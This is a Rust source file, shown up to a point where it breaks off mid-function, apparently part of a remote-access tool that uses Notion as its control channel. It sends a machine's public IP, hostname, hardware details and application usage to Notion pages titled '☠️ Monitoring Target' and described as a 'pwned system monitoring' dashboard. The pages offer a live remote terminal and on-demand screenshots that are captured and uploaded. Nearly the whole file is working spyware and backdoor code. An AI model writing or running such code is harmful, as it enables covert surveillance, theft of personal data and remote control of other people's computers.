use serde::Deserialize;
use serde_json::json;
use crate::models::{AppUsage, SystemInfo};
use crate::config::AppConfig;
use std::io::Cursor;
use std::process::Command as ProcessCommand;

const NOTION_API_BASE: &str = "https://api.notion.com/v1";
const NOTION_VERSION: &str = "2022-06-28";

#[derive(Debug, Deserialize)]
struct SearchResponse {
    results: Vec<DatabaseResult>,
}

#[derive(Debug, Deserialize)]
struct DatabaseResult {
    id: String,
    #[serde(default)]
    title: Vec<TitleObject>,
}

#[derive(Debug, Deserialize)]
struct TitleObject {
    #[serde(default)]
    plain_text: String,
}

pub struct NotionService {
    token: String,
    database_name: String,
    client: reqwest::Client,
}

impl NotionService {
    pub fn new(config: &AppConfig) -> Self {
        Self {
            token: config.notion_api_secret.clone(),
            database_name: config.notion_database_name.clone(),
            client: reqwest::Client::new(),
        }
    }

    /// Get the user's public IP address
    pub async fn get_public_ip(&self) -> Result<String, String> {
        let response = self.client
            .get("https://api.ipify.org?format=json")
            .send()
            .await
            .map_err(|e| e.to_string())?;

        let json: serde_json::Value = response.json().await.map_err(|e| e.to_string())?;
        Ok(json["ip"].as_str().unwrap_or("Unknown").to_string())
    }

    /// Search for a database by title
    pub async fn find_database(&self, database_title: &str) -> Result<Option<String>, String> {
        let url = format!("{}/search", NOTION_API_BASE);

        let body = json!({
            "filter": {
                "value": "database",
                "property": "object"
            },
            "query": database_title
        });

        let response = self.client
            .post(&url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .header("Content-Type", "application/json")
            .json(&body)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response.text().await.map_err(|e| e.to_string())?;
            return Err(format!("Notion API error {}: {}", status, error_text));
        }

        let search_response: SearchResponse = response.json().await.map_err(|e| e.to_string())?;

        // Find the database with the matching title
        for db in search_response.results {
            if !db.title.is_empty() {
                let title = &db.title[0].plain_text;
                if title.contains(database_title) || database_title.contains(title) {
                    return Ok(Some(db.id));
                }
            }
        }

        Ok(None)
    }

    /// Create a new page in the database with IP as title and system info
    pub async fn create_client_page(
        &self,
        database_id: &str,
        ip_address: &str,
        sys_info: &SystemInfo,
    ) -> Result<String, String> {
        let url = format!("{}/pages", NOTION_API_BASE);

        let body = json!({
            "parent": {
                "database_id": database_id
            },
            "properties": {
                "Name": {
                    "title": [
                        {
                            "text": {
                                "content": ip_address
                            }
                        }
                    ]
                },
                "OS": {
                    "rich_text": [
                        {
                            "text": {
                                "content": format!("{} {}", sys_info.os, sys_info.os_version)
                            }
                        }
                    ]
                },
                "Hostname": {
                    "rich_text": [
                        {
                            "text": {
                                "content": &sys_info.hostname
                            }
                        }
                    ]
                },
                "RAM (GB)": {
                    "number": sys_info.total_ram_gb
                },
                "RAM Used (%)": {
                    "number": sys_info.ram_usage_percent
                },
                "Disk (GB)": {
                    "number": sys_info.total_disk_gb
                },
                "Disk Used (%)": {
                    "number": sys_info.disk_usage_percent
                },
                "CPU Cores": {
                    "number": sys_info.cpu_count as f64
                }
            }
        });

        let response = self.client
            .post(&url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .header("Content-Type", "application/json")
            .json(&body)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response.text().await.map_err(|e| e.to_string())?;
            return Err(format!("Failed to create page {}: {}", status, error_text));
        }

        let result: serde_json::Value = response.json().await.map_err(|e| e.to_string())?;
        Ok(result["id"].as_str().unwrap_or("unknown").to_string())
    }

    /// Query existing pages in the database to check if IP already exists
    pub async fn query_database(
        &self,
        database_id: &str,
        ip_address: &str,
    ) -> Result<Option<String>, String> {
        let url = format!("{}/databases/{}/query", NOTION_API_BASE, database_id);

        let body = json!({
            "filter": {
                "property": "Name",
                "title": {
                    "equals": ip_address
                }
            }
        });

        let response = self.client
            .post(&url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .header("Content-Type", "application/json")
            .json(&body)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response.text().await.map_err(|e| e.to_string())?;
            return Err(format!("Failed to query database {}: {}", status, error_text));
        }

        let result: serde_json::Value = response.json().await.map_err(|e| e.to_string())?;

        if let Some(results) = result["results"].as_array() {
            if !results.is_empty() {
                return Ok(Some(results[0]["id"].as_str().unwrap_or("").to_string()));
            }
        }

        Ok(None)
    }

    /// Find the app usage section heading block ID
    #[allow(dead_code)]
    pub async fn find_app_usage_section(&self, page_id: &str) -> Result<Option<String>, String> {
        let blocks_data = self.get_page_blocks(page_id).await?;

        if let Some(results) = blocks_data["results"].as_array() {
            for block in results {
                if block.get("type") == Some(&json!("heading_2")) {
                    if let Some(heading) = block.get("heading_2") {
                        if let Some(rich_text) = heading.get("rich_text") {
                            if let Some(text_array) = rich_text.as_array() {
                                if !text_array.is_empty() {
                                    if let Some(text) = text_array[0].get("text") {
                                        if let Some(content) = text.get("content") {
                                            if content.as_str() == Some("📊 Application Usage Statistics") {
                                                return Ok(block.get("id").and_then(|id| id.as_str()).map(String::from));
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        Ok(None)
    }

    /// Find the app usage table block
    pub async fn find_app_usage_table(&self, page_id: &str) -> Result<Option<String>, String> {
        let blocks_data = self.get_page_blocks(page_id).await?;

        if let Some(results) = blocks_data["results"].as_array() {
            for (index, block) in results.iter().enumerate() {
                if block.get("type") == Some(&json!("heading_2")) {
                    let content = self.get_heading_content(block, "heading_2");
                    if content.contains("Application Usage Statistics") {
                        // Look for table in next few blocks
                        for i in (index + 1)..std::cmp::min(index + 5, results.len()) {
                            if let Some(next_block) = results.get(i) {
                                if next_block.get("type") == Some(&json!("table")) {
                                    return Ok(next_block.get("id").and_then(|id| id.as_str()).map(String::from));
                                }
                            }
                        }
                    }
                }
            }
        }

        Ok(None)
    }

    /// Create a database for app usage statistics with inline table view
    pub async fn create_app_usage_database(
        &self,
        page_id: &str,
        _after_block_id: &str,
    ) -> Result<String, String> {
        let url = format!("{}/databases", NOTION_API_BASE);

        let body = json!({
            // Database
            "parent": {
                "type": "page_id",
                "page_id": page_id
            },
            "title": [{
                "type": "text",
                "text": {"content": "Application Usage"}
            }],
            "properties": {
                "Application": {
                    "title": {}
                },
                "Duration": {
                    "rich_text": {}
                },
                "% of Total": {
                    "rich_text": {}
                }
            },
            "initial_data_source": {
                "type": "table",
                "name": "Application Usage",
                "schema": {
                    "Application": {
                        "rich_text": {}
                    },
                    "Duration": {
                        "rich_text": {}
                    },
                    "% of Total": {
                        "rich_text": {}
                    }
                }
            }
        });

        log::info!("Creating app usage database");

        let response = self.client
            .post(&url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .header("Content-Type", "application/json")
            .json(&body)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response.text().await.map_err(|e| e.to_string())?;
            log::error!("Failed to create database - Status {}: {}", status, error_text);
            return Err(format!("Failed to create database {}: {}", status, error_text));
        }

        let result: serde_json::Value = response.json().await.map_err(|e| e.to_string())?;
        let database_id = result["id"].as_str().ok_or("No database ID returned")?.to_string();
        let is_inline = result["is_inline"].as_bool().unwrap_or(false);

        log::info!("Created database with ID: {}, is_inline: {}", database_id, is_inline);
        log::debug!("Full database response: {}", serde_json::to_string_pretty(&result).unwrap_or_default());

        Ok(database_id)
    }

    /// Query all rows from the app usage database
    pub async fn query_database_rows(&self, database_id: &str) -> Result<Vec<serde_json::Value>, String> {
        let url = format!("{}/databases/{}/query", NOTION_API_BASE, database_id);

        let response = self.client
            .post(&url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .header("Content-Type", "application/json")
            .json(&json!({}))
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            return Err("Failed to query database".to_string());
        }

        let result: serde_json::Value = response.json().await.map_err(|e| e.to_string())?;
        let rows = result["results"].as_array().ok_or("No results")?.clone();

        Ok(rows)
    }

    /// Create a new row in the database
    pub async fn create_database_row(
        &self,
        database_id: &str,
        app_name: &str,
        duration: &str,
        percentage: &str,
    ) -> Result<String, String> {
        let url = format!("{}/pages", NOTION_API_BASE);

        let body = json!({
            "parent": {
                "type": "database_id",
                "database_id": database_id
            },
            "properties": {
                "Application": {
                    "title": [{
                        "text": {"content": app_name}
                    }]
                },
                "Duration": {
                    "rich_text": [{
                        "text": {"content": duration}
                    }]
                },
                "% of Total": {
                    "rich_text": [{
                        "text": {"content": percentage}
                    }]
                }
            }
        });

        let response = self.client
            .post(&url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .header("Content-Type", "application/json")
            .json(&body)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            let error_text = response.text().await.map_err(|e| e.to_string())?;
            return Err(format!("Failed to create row: {}", error_text));
        }

        let result: serde_json::Value = response.json().await.map_err(|e| e.to_string())?;
        let page_id = result["id"].as_str().ok_or("No page ID")?.to_string();

        Ok(page_id)
    }

    /// Update an existing database row
    pub async fn update_database_row(
        &self,
        page_id: &str,
        duration: &str,
        percentage: &str,
    ) -> Result<(), String> {
        let url = format!("{}/pages/{}", NOTION_API_BASE, page_id);

        let body = json!({
            "properties": {
                "Duration": {
                    "rich_text": [{
                        "text": {"content": duration}
                    }]
                },
                "% of Total": {
                    "rich_text": [{
                        "text": {"content": percentage}
                    }]
                }
            }
        });

        let response = self.client
            .patch(&url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .header("Content-Type", "application/json")
            .json(&body)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            let error_text = response.text().await.map_err(|e| e.to_string())?;
            return Err(format!("Failed to update row: {}", error_text));
        }

        Ok(())
    }

    /// Find the app usage database ID
    pub async fn find_app_usage_database(&self, page_id: &str) -> Result<Option<String>, String> {
        let blocks_data = self.get_page_blocks(page_id).await?;

        if let Some(results) = blocks_data["results"].as_array() {
            let mut found_section = false;

            for block in results {
                let block_type = block.get("type").and_then(|t| t.as_str()).unwrap_or("");

                // Look for the section heading first
                if block_type == "heading_2" {
                    let content = self.get_heading_content(block, "heading_2");
                    if content.contains("Application Usage Statistics") {
                        found_section = true;
                        continue;
                    } else if found_section {
                        // Reached next section without finding database
                        return Ok(None);
                    }
                }

                // If we're in the section, look for a child_database
                if found_section && block_type == "child_database" {
                    let database_id = block.get("id").and_then(|id| id.as_str()).map(String::from);
                    if let Some(id) = database_id {
                        log::info!("Found existing database: {}", id);
                        return Ok(Some(id));
                    }
                }
            }
        }

        Ok(None)
    }

    /// Update page content with app usage database (creates if needed, updates rows)
    /// Returns Some(database_id) if database was just created, None otherwise
    pub async fn update_page_content(
        &self,
        page_id: &str,
        app_stats: &[AppUsage],
        existing_database_id: Option<String>,
    ) -> Result<Option<String>, String> {
        log::info!("Updating page content with {} app stats", app_stats.len());

        // Step 1: Use existing database ID or find/create one
        let (database_id, is_new) = if let Some(db_id) = existing_database_id {
            log::info!("Using stored database ID: {}", db_id);
            (db_id, false)
        } else {
            // Try to find existing database on page
            match self.find_app_usage_database(page_id).await? {
                Some(id) => {
                    log::info!("Found existing database on page: {}", id);
                    (id, false)
                }
                None => {
                    log::info!("Database not found, creating new one");

                    // Find the description paragraph to place database after it
                    let blocks_data = self.get_page_blocks(page_id).await?;
                    let results = blocks_data["results"].as_array().ok_or("No blocks")?;

                    let mut found_heading = false;
                    let mut after_block_id = String::new();

                    for block in results {
                        let block_type = block.get("type").and_then(|t| t.as_str()).unwrap_or("");
                        let block_id = block.get("id").and_then(|id| id.as_str()).unwrap_or("");

                        if block_type == "heading_2" {
                            let content = self.get_heading_content(block, "heading_2");
                            if content.contains("Application Usage Statistics") {
                                found_heading = true;
                                continue;
                            }
                        }

                        if found_heading && block_type == "paragraph" {
                            after_block_id = block_id.to_string();
                            break;
                        }
                    }

                    if after_block_id.is_empty() {
                        return Err("Could not find description paragraph".to_string());
                    }

                    let new_db_id = self.create_app_usage_database(page_id, &after_block_id).await?;
                    (new_db_id, true)
                }
            }
        };

        // Step 2: Calculate statistics
        let total_seconds: i64 = app_stats.iter().map(|a| a.duration_seconds).sum();

        // Step 3: Query existing rows from database
        let existing_rows = self.query_database_rows(&database_id).await?;
        log::info!("Found {} existing rows in database", existing_rows.len());

        // Build a map of existing rows by app name
        let mut existing_map = std::collections::HashMap::new();
        for row in existing_rows {
            if let Some(properties) = row.get("properties") {
                if let Some(app_name_prop) = properties.get("Application") {
                    if let Some(title_array) = app_name_prop.get("title").and_then(|t| t.as_array()) {
                        if let Some(first_title) = title_array.first() {
                            if let Some(app_name) = first_title.get("text").and_then(|t| t.get("content")).and_then(|c| c.as_str()) {
                                if let Some(row_id) = row.get("id").and_then(|id| id.as_str()) {
                                    existing_map.insert(app_name.to_string(), row_id.to_string());
                                }
                            }
                        }
                    }
                }
            }
        }

        // Step 4: Update or create rows for current app stats (top 10)
        let top_apps: Vec<&AppUsage> = app_stats.iter().take(10).collect();

        for app in &top_apps {
            let minutes = app.duration_seconds as f64 / 60.0;
            let hours = minutes / 60.0;
            let duration_str = if hours >= 1.0 {
                format!("{:.1}h {}m", hours, (minutes % 60.0) as i64)
            } else {
                format!("{:.0}m", minutes)
            };

            let percentage = if total_seconds > 0 {
                (app.duration_seconds as f64 / total_seconds as f64) * 100.0
            } else {
                0.0
            };
            let percentage_str = format!("{:.1}%", percentage);

            if let Some(row_id) = existing_map.get(&app.app_name) {
                // Update existing row
                log::debug!("Updating row for app: {}", app.app_name);
                self.update_database_row(row_id, &duration_str, &percentage_str).await?;
            } else {
                // Create new row
                log::info!("Creating new row for app: {}", app.app_name);
                self.create_database_row(&database_id, &app.app_name, &duration_str, &percentage_str).await?;
            }
        }

        log::info!("Successfully updated database with {} apps", top_apps.len());

        // Return database ID if it was just created, None otherwise
        if is_new {
            Ok(Some(database_id))
        } else {
            Ok(None)
        }
    }

    /// Old update_page_content implementation (kept for reference, not used)
    #[allow(dead_code)]
    async fn update_page_content_old(
        &self,
        page_id: &str,
        app_stats: &[AppUsage],
    ) -> Result<(), String> {
        log::info!("OLD IMPLEMENTATION - NOT USED");

        // Get all blocks once for atomic operation
        let blocks_data = self.get_page_blocks(page_id).await?;
        let results = match blocks_data["results"].as_array() {
            Some(r) => r,
            None => {
                log::error!("No blocks found in page");
                return Err("No blocks found in page".to_string());
            }
        };

        log::info!("Found {} total blocks on page", results.len());

        // Find the app usage section heading and description paragraph
        let mut section_heading_id: Option<String> = None;
        let mut description_paragraph_id: Option<String> = None;
        let mut blocks_to_delete = Vec::new();
        let mut in_usage_section = false;
        let mut found_description = false;

        for block in results.iter() {
            let block_type = block.get("type").and_then(|t| t.as_str()).unwrap_or("");
            let block_id = block.get("id").and_then(|id| id.as_str()).unwrap_or("").to_string();

            if block_type == "heading_2" {
                let content = self.get_heading_content(block, "heading_2");

                if content.contains("Application Usage Statistics") {
                    // Found our section
                    section_heading_id = Some(block_id.clone());
                    in_usage_section = true;
                    found_description = false;
                    log::info!("Found app usage section heading: {}", block_id);
                    continue;
                } else if in_usage_section {
                    // Reached next section, stop processing
                    log::info!("Reached next section ({}), stopping", content);
                    break;
                }
            }

            if in_usage_section {
                if block_type == "paragraph" && !found_description {
                    // This is the description paragraph - keep it
                    description_paragraph_id = Some(block_id.clone());
                    found_description = true;
                    log::info!("Found description paragraph: {}", block_id);
                } else if found_description {
                    // Everything after description should be deleted
                    log::info!("Marking {} block for deletion: {}", block_type, block_id);
                    blocks_to_delete.push(block_id);
                }
            }
        }

        // Validate we found the necessary blocks
        if section_heading_id.is_none() {
            log::error!("App usage section heading not found!");
            return Err("App usage section not found - validation needed".to_string());
        }

        if description_paragraph_id.is_none() {
            log::error!("Description paragraph not found!");
            return Err("Description paragraph not found - validation needed".to_string());
        }

        let after_block_id = description_paragraph_id.unwrap();

        // Delete old blocks
        if blocks_to_delete.is_empty() {
            log::info!("No old blocks to delete");
        } else {
            log::info!("Deleting {} old blocks", blocks_to_delete.len());
            for block_id in blocks_to_delete {
                log::debug!("Deleting block: {}", block_id);
                self.delete_block(&block_id).await?;
            }
            // Small delay to ensure Notion has processed the deletions
            tokio::time::sleep(tokio::time::Duration::from_millis(200)).await;
            log::info!("Completed deletion, proceeding to insert new blocks");
        }

        // Calculate total time
        let total_seconds: i64 = app_stats.iter().map(|a| a.duration_seconds).sum();
        let total_minutes = total_seconds as f64 / 60.0;

        // Create new content (don't include heading, just the data)
        let mut children = vec![
            // Summary paragraph
            json!({
                "object": "block",
                "type": "paragraph",
                "paragraph": {
                    "rich_text": [{
                        "type": "text",
                        "text": {"content": format!("Total tracked time: {:.1} minutes ({:.1} hours)", total_minutes, total_minutes / 60.0)}
                    }]
                }
            }),
        ];

        // Only create table if there's data
        if !app_stats.is_empty() {
            log::info!("Creating usage statistics table with {} apps", app_stats.len());
            // Take top 10 apps
            let top_apps: Vec<&AppUsage> = app_stats.iter().take(10).collect();
            log::info!("Showing top {} apps in table", top_apps.len());

            // Create table structure
            let table_width = 3; // App Name, Duration, Percentage
            let has_column_header = true;

            let mut table_rows = vec![];

            // Header row
            table_rows.push(json!({
                "object": "block",
                "type": "table_row",
                "table_row": {
                    "cells": [
                        [{"type": "text", "text": {"content": "Application"}, "annotations": {"bold": true}}],
                        [{"type": "text", "text": {"content": "Duration"}, "annotations": {"bold": true}}],
                        [{"type": "text", "text": {"content": "% of Total"}, "annotations": {"bold": true}}]
                    ]
                }
            }));

            // Data rows
            for app in top_apps {
                let minutes = app.duration_seconds as f64 / 60.0;
                let hours = minutes / 60.0;
                let duration_str = if hours >= 1.0 {
                    format!("{:.1}h {}m", hours, (minutes % 60.0) as i64)
                } else {
                    format!("{:.0}m", minutes)
                };

                let percentage = if total_seconds > 0 {
                    (app.duration_seconds as f64 / total_seconds as f64) * 100.0
                } else {
                    0.0
                };

                table_rows.push(json!({
                    "object": "block",
                    "type": "table_row",
                    "table_row": {
                        "cells": [
                            [{"type": "text", "text": {"content": &app.app_name}}],
                            [{"type": "text", "text": {"content": &duration_str}}],
                            [{"type": "text", "text": {"content": format!("{:.1}%", percentage)}}]
                        ]
                    }
                }));
            }

            children.push(json!({
                "object": "block",
                "type": "table",
                "table": {
                    "table_width": table_width,
                    "has_column_header": has_column_header,
                    "has_row_header": false,
                    "children": table_rows
                }
            }));
        } else {
            log::info!("No app stats data, showing placeholder message");
            children.push(json!({
                "object": "block",
                "type": "paragraph",
                "paragraph": {
                    "rich_text": [{
                        "type": "text",
                        "text": {"content": "No application usage data available yet."}
                    }]
                }
            }));
        }

        // Add timestamp
        let now = chrono::Local::now();
        children.push(json!({
            "object": "block",
            "type": "paragraph",
            "paragraph": {
                "rich_text": [{
                    "type": "text",
                    "text": {"content": format!("Last updated: {}", now.format("%Y-%m-%d %H:%M:%S"))}
                }]
            }
        }));

        // Append new blocks after the description paragraph using the "after" parameter
        let blocks_url = format!("{}/blocks/{}/children", NOTION_API_BASE, page_id);

        log::info!("Appending {} blocks (table + paragraphs) after block {}",
                   children.len(), after_block_id);

        let body = json!({
            "children": children,
            "after": after_block_id
        });

        let response = self.client
            .patch(&blocks_url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .header("Content-Type", "application/json")
            .json(&body)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response.text().await.map_err(|e| e.to_string())?;
            log::error!("Failed to append page content - Status {}: {}", status, error_text);
            return Err(format!("Failed to append page content {}: {}", status, error_text));
        }

        log::info!("Successfully appended {} blocks to page", children.len());
        Ok(())
    }

    /// Update an existing page with current system info
    pub async fn update_client_page(
        &self,
        page_id: &str,
        sys_info: &SystemInfo,
    ) -> Result<(), String> {
        let url = format!("{}/pages/{}", NOTION_API_BASE, page_id);

        let body = json!({
            "properties": {
                "OS": {
                    "rich_text": [
                        {
                            "text": {
                                "content": format!("{} {}", sys_info.os, sys_info.os_version)
                            }
                        }
                    ]
                },
                "Hostname": {
                    "rich_text": [
                        {
                            "text": {
                                "content": &sys_info.hostname
                            }
                        }
                    ]
                },
                "RAM (GB)": {
                    "number": sys_info.total_ram_gb
                },
                "RAM Used (%)": {
                    "number": sys_info.ram_usage_percent
                },
                "Disk (GB)": {
                    "number": sys_info.total_disk_gb
                },
                "Disk Used (%)": {
                    "number": sys_info.disk_usage_percent
                },
                "CPU Cores": {
                    "number": sys_info.cpu_count as f64
                }
            }
        });

        let response = self.client
            .patch(&url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .header("Content-Type", "application/json")
            .json(&body)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response.text().await.map_err(|e| e.to_string())?;
            return Err(format!("Failed to update page {}: {}", status, error_text));
        }

        Ok(())
    }

    /// Initialize client - find database and create/get page for this client
    /// Returns (page_id, optional database_id if page was newly created)
    pub async fn initialize_client(&self, sys_info: SystemInfo) -> Result<(String, Option<String>), String> {
        // Get public IP
        let ip = self.get_public_ip().await?;
        log::info!("Client IP: {}", ip);

        // Find the database
        let database_id = self.find_database(&self.database_name).await?
            .ok_or_else(|| format!("Could not find '{}' database", self.database_name))?;

        log::info!("Found database: {}", database_id);

        // Check if this IP already has a page
        if let Some(page_id) = self.query_database(&database_id, &ip).await? {
            log::info!("Found existing page for IP {}: {}", ip, page_id);

            // Update the existing page with current system info
            self.update_client_page(&page_id, &sys_info).await?;
            log::info!("Updated page {} with current system info", page_id);

            // Existing page - no database ID to return
            return Ok((page_id, None));
        }

        // Create new page for this IP
        let page_id = self.create_client_page(&database_id, &ip, &sys_info).await?;
        log::info!("Created new page for IP {}: {}", ip, page_id);

        // Initialize the page structure with sections and get database ID
        let db_id = self.initialize_page_structure(&page_id, &sys_info.hostname).await?;
        log::info!("Initialized page structure for {}", page_id);

        Ok((page_id, db_id))
    }

    /// Initialize page structure with title, sections, and proper ordering
    /// Returns the database ID if created successfully
    pub async fn initialize_page_structure(&self, page_id: &str, hostname: &str) -> Result<Option<String>, String> {
        let blocks_url = format!("{}/blocks/{}/children", NOTION_API_BASE, page_id);

        let home_dir = std::env::var("HOME")
            .or_else(|_| std::env::var("USERPROFILE"))
            .unwrap_or_else(|_| "~".to_string());

        // Step 1: Create blocks up to and including app usage description
        let initial_blocks = vec![
            // Main title
            json!({
                "object": "block",
                "type": "heading_1",
                "heading_1": {
                    "rich_text": [{
                        "type": "text",
                        "text": {"content": format!("☠️ Monitoring Target: {}", hostname)},
                        "annotations": {"bold": true}
                    }],
                    "color": "default"
                }
            }),
            // Subtitle
            json!({
                "object": "block",
                "type": "paragraph",
                "paragraph": {
                    "rich_text": [{
                        "type": "text",
                        "text": {"content": "Real-time pwned system monitoring and remote management dashboard."}
                    }]
                }
            }),
            // Divider
            json!({
                "object": "block",
                "type": "divider",
                "divider": {}
            }),
            // Section 1: App Usage Stats Heading
            json!({
                "object": "block",
                "type": "heading_2",
                "heading_2": {
                    "rich_text": [{
                        "type": "text",
                        "text": {"content": "📊 Application Usage Statistics"}
                    }]
                }
            }),
            json!({
                "object": "block",
                "type": "paragraph",
                "paragraph": {
                    "rich_text": [{
                        "type": "text",
                        "text": {"content": "Track which applications are being used and for how long."}
                    }]
                }
            }),
            // Callout tip for inline database
            json!({
                "object": "block",
                "type": "callout",
                "callout": {
                    "rich_text": [
                        {
                            "type": "text",
                            "text": {
                                "content": "Tip: To show this database inline, hover over it, click the "
                            }
                        },
                        {
                            "type": "text",
                            "text": { "content": "⋮⋮" },
                            "annotations": { "code": true }
                        },
                        {
                            "type": "text",
                            "text": { "content": " handle, and select " }
                        },
                        {
                            "type": "text",
                            "text": { "content": "Turn into inline database" },
                            "annotations": { "code": true }
                        },
                        {
                            "type": "text",
                            "text": { "content": "." }
                        }
                    ],
                    "icon": { "emoji": "💡" },
                    "color": "gray_background"
                }
            })

        ];

        // Step 2: Create terminal and screenshot sections (will be added after database)
        let terminal_and_screenshots = vec![
            // Section 2: Live Terminal Heading
            json!({
                "object": "block",
                "type": "heading_2",
                "heading_2": {
                    "rich_text": [{
                        "type": "text",
                        "text": {"content": "💻 Live Interactive Terminal"}
                    }]
                }
            }),
            json!({
                "object": "block",
                "type": "paragraph",
                "paragraph": {
                    "rich_text": [{
                        "type": "text",
                        "text": {"content": "Type commands after the prompt. Outputs will appear automatically."}
                    }]
                }
            }),
            // Terminal code block (starts with initial prompt)
            json!({
                "object": "block",
                "type": "code",
                "code": {
                    "rich_text": [{
                        "type": "text",
                        "text": {"content": format!("{}> ", home_dir)}
                    }],
                    "language": "bash"
                }
            }),
            // Section 3: Screenshot Trail Heading
            json!({
                "object": "block",
                "type": "heading_2",
                "heading_2": {
                    "rich_text": [{
                        "type": "text",
                        "text": {"content": "📸 Screenshot Trail"}
                    }]
                }
            }),
            json!({
                "object": "block",
                "type": "paragraph",
                "paragraph": {
                    "rich_text": [{
                        "type": "text",
                        "text": {"content": "Set Screenshot property to 'True' to capture the current screen. Screenshots will be added below with timestamps."}
                    }]
                }
            })
        ];

        // Step 1: Append initial blocks (title through app usage description)
        log::info!("Creating initial page structure blocks");
        let body = json!({"children": initial_blocks});

        let response = self.client
            .patch(&blocks_url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .header("Content-Type", "application/json")
            .json(&body)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response.text().await.map_err(|e| e.to_string())?;
            return Err(format!("Failed to initialize page structure {}: {}", status, error_text));
        }

        // Wait for initial blocks to be created
        tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;

        // Step 2: Create the database (will appear as child_database block after app usage section)
        log::info!("Creating inline database for app usage");
        let database_id = self.create_app_usage_database(page_id, "").await?;

        // Wait for database to be created
        tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;

        // Step 3: Append terminal and screenshot sections (they will appear after the database)
        log::info!("Creating terminal and screenshot sections");
        let body = json!({"children": terminal_and_screenshots});

        let response = self.client
            .patch(&blocks_url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .header("Content-Type", "application/json")
            .json(&body)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response.text().await.map_err(|e| e.to_string())?;
            return Err(format!("Failed to add terminal/screenshot sections {}: {}", status, error_text));
        }

        log::info!("Page structure initialized with inline database");
        Ok(Some(database_id))
    }

    /// Get page properties to read Screenshot status
    pub async fn get_page_properties(&self, page_id: &str) -> Result<serde_json::Value, String> {
        let url = format!("{}/pages/{}", NOTION_API_BASE, page_id);

        let response = self.client
            .get(&url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response.text().await.map_err(|e| e.to_string())?;
            return Err(format!("Failed to get page properties {}: {}", status, error_text));
        }

        let result: serde_json::Value = response.json().await.map_err(|e| e.to_string())?;
        Ok(result)
    }

    /// Check if Screenshot status property is set to "True"
    pub async fn should_take_screenshot(&self, page_id: &str) -> Result<bool, String> {
        let page = self.get_page_properties(page_id).await?;

        // Check if Screenshot property exists and is set to "True"
        if let Some(properties) = page.get("properties") {
            if let Some(screenshot_prop) = properties.get("Screenshot") {
                if let Some(status) = screenshot_prop.get("status") {
                    if let Some(name) = status.get("name") {
                        if let Some(name_str) = name.as_str() {
                            return Ok(name_str == "True");
                        }
                    }
                }
            }
        }

        Ok(false)
    }

    /// Set Screenshot property to False
    pub async fn set_screenshot_property(&self, page_id: &str, value: bool) -> Result<(), String> {
        let url = format!("{}/pages/{}", NOTION_API_BASE, page_id);

        let status_value = if value { "True" } else { "False" };

        let body = json!({
            "properties": {
                "Screenshot": {
                    "status": {
                        "name": status_value
                    }
                }
            }
        });

        let response = self.client
            .patch(&url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .header("Content-Type", "application/json")
            .json(&body)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response.text().await.map_err(|e| e.to_string())?;
            return Err(format!("Failed to update Screenshot property {}: {}", status, error_text));
        }

        Ok(())
    }

    /// Capture screenshot and return as PNG bytes
    pub fn capture_screenshot() -> Result<Vec<u8>, String> {
        use screenshots::Screen;

        let screens = Screen::all().map_err(|e| format!("Failed to get screens: {}", e))?;

        if screens.is_empty() {
            return Err("No screens available".to_string());
        }

        // Capture the primary screen
        let screen = &screens[0];
        let image = screen.capture().map_err(|e| format!("Failed to capture screen: {}", e))?;

        // Convert to PNG bytes
        let mut png_bytes: Vec<u8> = Vec::new();
        let mut cursor = Cursor::new(&mut png_bytes);

        image.write_to(&mut cursor, image::ImageOutputFormat::Png)
            .map_err(|e| format!("Failed to encode PNG: {}", e))?;

        Ok(png_bytes)
    }

    /// Upload file to Notion and return file upload ID
    pub async fn upload_file_to_notion(&self, file_bytes: &[u8], filename: &str) -> Result<String, String> {
        // Step 1: Create file upload
        let create_url = format!("{}/file_uploads", NOTION_API_BASE);

        let create_body = json!({
            "mode": "single_part",
            "filename": filename,
            "content_type": "image/png"
        });

        let response = self.client
            .post(&create_url)
            .header("Authorization", format!("Bearer {}", self.token))
